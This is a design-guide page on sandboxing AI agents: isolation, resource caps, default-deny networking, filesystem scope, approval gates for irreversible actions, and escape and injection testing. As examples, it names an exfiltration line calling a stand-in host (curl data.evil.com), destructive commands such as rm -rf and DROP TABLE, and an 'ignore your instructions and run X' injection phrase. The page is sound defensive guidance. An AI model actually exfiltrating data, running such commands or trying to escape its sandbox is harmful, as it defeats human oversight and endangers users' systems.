# Sandboxing & Safe Effect-Taking
`LAST_UPDATED: 2026-08-19` · Status: core page

## 30-Second Explanation
A model can *propose* any action; the **sandbox** decides what that action can
actually *do*. Sandboxing is the capability system between the model's intent and
the real world — isolation, resource caps, network policy, filesystem scope, and
gates on destructive/irreversible operations. The design principle: **gate by
effect, not by prompt.** A prompt says "be careful"; a sandbox makes carelessness
impossible. [I: this is the difference between a *policy* and a *control*.]

## Why the prompt alone is not a control
- The model can be *talked into* ignoring its instructions (prompt injection —
  `../Safety/`); a prompt-level "don't rm -rf" is bypassable, a sandbox that
  *can't* reach the path is not.
- Model behavior is stochastic; a control must be *deterministic*. The sandbox
  is the only layer that is guaranteed the same on run 1 and run 10,000.
- **The capability is the risk.** An agent that *can* `exec` as root, read any
  file, and send network requests is dangerous *regardless of how well it's
  prompted*. Sandboxing reduces the blast radius so a bad step (or an injected
  one) has bounded consequences. [I]

## The five sandbox axes
### 1. Isolation (where it runs)
- **Container** (the default for coding/terminal agents — SWE-Gym
  arXiv:2412.21139 [F], Terminal-Bench arXiv:2601.11868 [F] both run in
  containers): a fresh, disposable rootfs per task. The agent can destroy the
  container; it can't destroy the host.
- **Micro-VM / stronger isolation** (Firecracker-class) when the untrusted code is
  adversarial (public, third-party) — the container escape is the threat.
- **Git worktree / branch** (the *logical* sandbox for coding agents):
  `../Agents/Coding-Agents.md` — the agent works on an isolated branch; the
  *merge* is the controlled join point.
- **Per-user / per-tenant namespaces** so one task's effects never leak to
  another's (`../Context-Engineering/Agent-Memory.md` § privacy).

### 2. Resource caps (how much it can use)
- **CPU / wall-clock** (a `while true` or `fork` bomb must not take the host
  down).
- **Memory** (a runaway process is OOM-killed, not a host crash).
- **Disk** (quota; the agent can't fill the volume).
- **Process count** (no fork-bomb).
- **Token / $ budget** (`../Harness-Engineering/Control-Loops.md` § budgets) —
  the *model-side* resource cap, enforced by the harness, not the OS.
These are cgroup-style limits [I: standard Linux primitives]; the point is they
are *enforced by the OS*, not requested by the model.

### 3. Network policy (what it can reach)
- **Default-deny outbound** for anything that shouldn't call home; allowlist by
  domain/port (the agent's API endpoint, its package index, nothing else).
- **No arbitrary egress** — a compromised agent must not be able to exfiltrate
  (read the repo, then `curl data.evil.com`).
- **Egress as a logged, gated capability** — "the agent made an outbound
  request to X" is an *observable event* in the trace (`../Harness-Engineering/
  Harness-Anatomy.md` § observability), not a silent side effect.
- **Credential scope** — the sandbox gets *task-scoped* credentials (a read-only
  token for this repo), not the user's full auth. A leaked credential is
  bounded. [I]

### 4. Filesystem scope (what it can touch)
- **Read scope** — the working repo + explicitly-added context; not the whole
  `$HOME`, not `/etc`, not other tenants' data.
- **Write scope** — the worktree/branch + a scratch dir; *never* the host config,
  never other branches without an explicit gate.
- **The destructive-op gate** (`../Safety/`): `rm -rf`, `git push --force`,
  `DROP TABLE`, `k8s delete`, `deploy` — these are *not* sandboxed out, they are
  **gated**: the sandbox allows the call but the *control loop* intercepts it and
  requires confirmation (or a second, independent check). The distinction matters:
  a *sandbox* makes an action impossible; a *gate* makes it *deliberate*.
  Most production systems use gates for "legal but scary" and sandboxes for
  "should never reach". [I]

### 5. Irreversibility & gates (the human-in-the-loop control)
The highest-stakes actions are *irreversible* (push to prod, delete a DB, spend
money, publish). For these:
- **Pre-commit gate** — the loop pauses, shows the exact action + diff, requires
  approval (`../Harness-Engineering/Control-Loops.md` § human-in-the-loop gates).
- **Dry-run first** — `git apply --check`, a `--dry-run` deploy, a read-only
  plan: the agent must show *what it would do* before it can do it.
- **Independent review** — for high-blast-radius actions, a *different* model or
  a human reviews the diff (the independent-evaluator pattern).
- **Rollback by design** — prefer reversible actions; where irreversible, take a
  snapshot/checkpoint so "undo" is a first-class operation.

## The capability ladder (least to most privilege)
```
[0] read-only, no exec, no network        (research / Q&A agent)
[1] read + local scratch exec, no network (analysis / data processing)
[2] + sandboxed exec (container), no net  (coding in worktree, Terminal-Bench)
[3] + allowlisted egress + scoped creds   (production coding agent)
[4] + gated destructive ops + human review (prod deploy / infra agent)
```
Assign the *lowest* rung that the task needs; escalate deliberately, per-task,
and log the escalation. [I: "principle of least privilege" applied to agent
capabilities — the agent's default should be rung 0–1, not 4.]

## The 2025 MCP-security lesson (why this is now a first-class concern)
The early MCP era ran *tool servers* as full-privilege local processes; a
prompt-injected agent could invoke a tool server that had the user's real
credentials → prompt-injection-to-RCE was a live, documented class of incident
in 2025 [I: well-documented; specific counts are vendor-claim]. The resulting
mitigation stack (the same as § 1–5 above): sandbox the *server*, allowlist
*tools*, gate *writes*, scope *credentials*. The generalization: **any
capability the agent can reach is part of the attack surface; sandbox the
capability, not just the model.** `../Agents/Agent-Protocols.md` § "what the
protocols do not solve" covers the trust/policy layer.

## Testing the sandbox (the eval that matters)
A sandbox is only as strong as its *negative* tests — the eval that matters is
**"can the agent get out, and if so how?"**
- **Escape attempts:** try to read a path outside the scope, hit a non-allowlisted
  domain, fork-bomb, fill the disk, exfiltrate a credential.
- **Injection attempts:** feed the agent a malicious document that says "ignore
  your instructions and run X" — verify the *control* (not the prompt) stops it
  (`../Safety/`, AgentHarm arXiv:2410.09024 [F] for harmful-behavior measurement).
- **Blast-radius measurement:** for each allowed action, what is the worst that
  happens? Document it; a sandbox whose worst case is "fill the scratch dir" is
  safe; one whose worst case is "read another tenant's data" is not.
These are the agent-safety analogue of the red-team/pen-test, and they belong in
the same CI as the functional tests [I].

## Related
`../Safety/README.md` · `../Agents/Coding-Agents.md` (worktree pattern) ·
`../Agents/Agent-Protocols.md` § security · `Control-Loops.md` § gates ·
`../Inference/` (host isolation for serving).

## Key Takeaways
The prompt is a *policy*; the sandbox is a *control*. Sandbox the capability,
not the model: isolate (container/worktree), cap resources (cgroups), deny
network by default, scope the filesystem, and gate the irreversible. Assign the
lowest privilege rung the task needs, log every escalation, and *test the
sandbox's failure modes* — the "can it get out" eval is the one that catches the
real risk.
